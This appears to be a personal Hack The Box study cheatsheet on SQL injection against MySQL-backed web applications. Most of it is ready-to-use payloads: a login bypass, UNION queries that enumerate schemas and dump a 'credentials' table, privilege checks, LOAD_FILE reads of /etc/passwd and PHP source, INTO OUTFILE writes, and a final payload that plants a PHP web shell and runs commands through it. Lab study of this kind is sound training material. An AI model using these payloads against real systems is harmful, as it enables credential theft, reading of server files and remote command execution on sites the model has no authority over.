# 1. HTB cheatsheet

Auth Bypass: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

INFORMATION_SCHEMA Database contains metadata of DBs and Tables in the server.

| Technique                              | Description                                                                                                   |
|----------------------------------------|---------------------------------------------------------------------------------------------------------------|
| `' or 1=1-- -`                         | Basic SQL injection to bypass login or test vulnerability                                                     |
| `' order by 1-- -`                     | Detects the number of columns by incrementing the number in `ORDER BY` until an error occurs (total columns)  |
| `' UNION select 1,2,3-- -`             | Detects the number of columns using `UNION` injection by increasing the number of columns until no error      |
| `SELECT @@version`                     | Checks the database version                                                                                   |
| `SELECT SLEEP(5)`                      | Blind SQL injection to pause execution, used with other clauses to confirm queries                            |
| `SELECT POW(1,1)`                      | Alternative blind SQL injection method to verify responses                                                    |
| `SELECT * FROM my_database.users;`     | Selects data from another database or table                                                                   |
| `SELECT database()`                    | Retrieves the current database name                                                                           |

<br>

List of databases --> List of tables within each database --> List of columns within each table

List all databases:		`' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

List of tables within each database: `' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` (TABLE_NAME column stores table names, TABLE_SCHEMA column points to the database each table belongs to)

List of columns within each table: `' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

Dump data from a table in another database: `' UNION select 1, username, password, 4 from dev.credentials-- -`

## 1.1. Reading files

The DB user must have the **FILE privilege** to load a file's content into a table and then dump data from that table and read files.

Current USER: 
- `SELECT USER()`
- `SELECT CURRENT_USER()`
- `SELECT user from mysql.user`

Check USER Privileges:
- `SELECT super_priv FROM mysql.user`
- `UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
- `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`
- `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
- `UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`

## 1.2. LOAD_FILE

Now that we know we have enough **privileges to read local system files**, let us do that using the **LOAD_FILE() function**.

`SELECT LOAD_FILE('/etc/passwd');`

`UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

`UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -` : the page ends up rendering the HTML code within the browser. The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.

## 1.3. Writing files

To be able to **write files** to the back-end server using a MySQL database, we **require** three things:
- User with **FILE privilege** enabled
- MySQL global **secure_file_priv** variable **not enabled**
- **Write access** to the location we want to write to on the back-end server

The **secure_file_priv** variable is used to determine **where to read/write files from**. An **empty value** lets us **read** files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, **NULL** means we **cannot read/write** from any directory. `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`

## 1.4. SELECT INTO OUTFILE

The **SELECT INTO OUTFILE** statement can be used to **write data*** from select queries into files.
- `SELECT * from users INTO OUTFILE '/tmp/credentials';`
- `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`

## 1.5. Writing Files through SQL Injection

To write a web shell, we must know the **base web directory** for the web server (i.e. **web root**). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots.
- `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`
- `union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`

## 1.6. Writing a Web Shell

`<?php system($_REQUEST[0]); ?>`
`union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL: `http://SERVER_IP:PORT/shell.php?0=id`
